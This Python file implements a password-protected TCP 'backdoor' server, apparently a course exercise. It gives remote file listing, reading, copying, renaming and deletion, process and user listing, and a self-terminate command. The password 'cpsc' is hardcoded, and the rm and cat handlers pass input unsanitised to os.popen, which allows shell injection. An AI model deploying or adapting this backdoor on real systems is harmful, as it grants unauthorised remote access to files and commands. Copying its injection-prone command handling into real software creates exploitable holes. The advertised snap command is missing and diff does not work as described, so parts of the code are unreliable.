import socketserver
import socket
import sys, os, shutil
import difflib

class MyTCPHandler(socketserver.BaseRequestHandler):

   
   BUFFER_SIZE = 4096
   def handle(self):

       descriptions = {}
       descriptions["pwd"] = 'pwd - return the current working directory'
       descriptions["cd"] = 'cd <dir> - change the current working directory to <dir>'
       descriptions["ls"] = 'ls - list the contents of the current working directory'
       descriptions["cp"] = 'cp <file1> <file2> - copy file1 to file2'
       descriptions["mv"] = 'mv <file1> <file2> - rename file1 to file2'
       descriptions["rm"] = 'rm <file> - delete file'
       descriptions["cat"] = 'cat <file> - return contents of the file'
       descriptions["snap"] = 'snap - take a snapshot of all the files in the current directory and save it in memory'
       descriptions["diff"] = 'diff - compare the contents of the current directory to the saved snapshot, and report differences (deleted files, new files and changed files)'
       descriptions["help"] = 'help [cmd] - print a list of commands, and if given an argument, print more detailed help for the command'
       descriptions["logout"] = 'logout - disconnect client'
       descriptions["off"] = 'off - terminate the backdoor program'
       descriptions["ps"] = 'ps - show currently running processes'
       descriptions["who"] = 'who - list user[s] currently logged in'

       password = "cpsc"

       intro = self.request.sendall(bytearray("Identify yourself!\n", "utf-8"))
       
       passed = False;

       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break
           if len(data) == 0:
               break
           data = data.decode( "utf-8")

           if (passed == False and len(data) > 0):      # compare user entered password and the actual password
               if (data.strip() == password):                           
                   self.request.sendall(bytearray("welcome boss\n", "utf-8"))
                   passed = True
                   continue
               else:
                    self.request.sendall(bytearray("bad password\n", "utf-8"))
                          
           # start commands here
           if passed == True:

               # pwd
               if data.strip() == "pwd":
                   self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8")) 
                   continue
               
               # cd <dir>
               if data.split(None, 1)[0] == "cd":
                   try:
                      self.request.sendall(bytearray("going to " + data.split(None,2)[1] + "\n", "utf-8"))
                      os.chdir(data.split(None, 2)[1])
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
               
               # ls
               if data.strip() == "ls":
                  command = os.popen("ls -l")          #execute ls -l command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                  continue
               
               # cp <file1> <file2>
               if data.split(None, 1)[0] == "cp":
                   file1 = data.split(None, 2)[1]
                   file2 = data.split(None, 3)[2]
                   try:
                       shutil.copyfile(file1, file2)
                       self.request.sendall(bytearray("OK\n", "utf-8"))
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
               
               # mv <file1> <file2>
               if data.split(None, 1)[0] == "mv":
                   file1 = data.split(None, 2)[1]
                   file2 = data.split(None, 3)[2]
                   try:
                      os.rename(file1, file2)
                      self.request.sendall(bytearray("OK\n", "utf-8")) 
                   except:
                       self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
                
                # rm <file>
               if data.split(None, 1)[0] == "rm":
                 filename = data.split(None, 2)[1]
                 try:
                   command = os.popen("rm " + filename)
                   self.request.sendall(bytearray("OK\n", "utf-8")) 
                 except:
                   self.request.sendall(bytearray("bad request\n", "utf-8"))
                 continue

                # cat <file>
               if data.split(None, 1)[0] == "cat":
                  catfile = data.split(None, 2)[1]              #get the name of the cat file
                  command = os.popen("cat " + catfile)          #execute cat command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                  continue
                

                # help [cmd]
               if data.split(None, 1)[0] == "help":
                
                  if len(data.split()) == 1:
                      self.request.sendall(bytearray("supported commands:\n", "utf-8"))
                      for cmd in descriptions.keys():
                          self.request.sendall(bytearray(cmd + "\n", "utf-8"))
                  
                  elif len(data.split()) == 2:
                      command = descriptions.get(data.split()[1])
                      self.request.sendall(bytearray(command + "\n", "utf-8"))
                  
                  else:                                                                         #accept exactly one command
                    self.request.sendall(bytearray("bad request\n", "utf-8"))
                  continue


                #ps                
               if data.strip() == "ps":
                  command = os.popen("ps")                      #execute ps command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  self.request.sendall(bytearray("\n",  "utf-8")) #write output to the server
                  continue

                #who
               if data.strip() == "who":
                  command = os.popen("who")          #execute cat command from operating system
                  contents = command.read()                     #read the output
                  self.request.sendall(bytearray(contents,  "utf-8")) #write output to the server
                  continue

               # logout
               if data.strip() == "logout":
                   self.request.sendall(bytearray("bye bye\n", "utf-8"))
                   break 

                # off
               if data.strip() == "off":
                  print("Terminating myself...")
                  self.request.sendall(bytearray("Terminating myself...So long\n", "utf-8"))
                  os._exit(1)                                                       #exit without ptinting traceback
                
               # diff 
               if data.strip() == "diff":
                   m = os.popen("ls -l")
                   m = m.read()
                   n = os.popen("ls")
                   n = n.read()
                   m = m.splitlines() 
                   n = n.splitlines()
                   #m = "abd defg".splitlines()
                   #n = "abc defg".splitlines()
                   difference = difflib.ndiff(m, n)
                   for a in difference:
                       if len(a.split()) > 1:                   # prevent going out of index
                           b = a.split(None, 1)
                           del b[0]
                           b = "".join(b)
                           if a.split()[0] == "+":              # check if added
                               self.request.sendall(bytearray(b + " - was added\n", "utf-8"))
                           elif a.split()[0] == "-":            # check if deleted
                               self.request.sendall(bytearray(b + " - was deleted\n", "utf-8"))
                           elif a.split()[0] == "?":            # check if changed
                               self.request.sendall(bytearray(b + " - was changed\n", "utf-8"))
                   self.request.sendall(bytearray("\n".join(list(difference)), "utf-8"))

               ######                     #####
               #                              #
               #    ADD MORE COMMANDS HERE!   #
               #                              #
               ######                     #####
               # end of all commands, everything else don't understand
               else:
                   self.request.sendall(bytearray("Sorry don't understand your request\n", "utf-8"))
           

if __name__ == "__main__":
   HOST, PORT = "localhost", int(sys.argv[1])
   server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
   print("backdoor listening on port ", PORT)
   server.serve_forever()
  
   
